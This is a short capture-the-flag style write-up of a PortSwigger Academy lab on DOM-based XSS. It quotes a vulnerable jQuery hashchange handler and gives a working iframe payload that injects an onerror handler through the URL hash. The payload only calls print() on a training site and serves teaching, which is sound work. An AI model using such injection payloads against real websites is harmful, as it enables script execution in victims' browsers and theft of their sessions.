
# DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


This is the problematic code in the Home page:

```
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```



![img](images/DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event/1.png)

To exploit it, it is possible to use the same payload as in https://portswigger.net/web-security/cross-site-scripting/dom-based:

```
<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
```



![img](images/DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event/2.png)
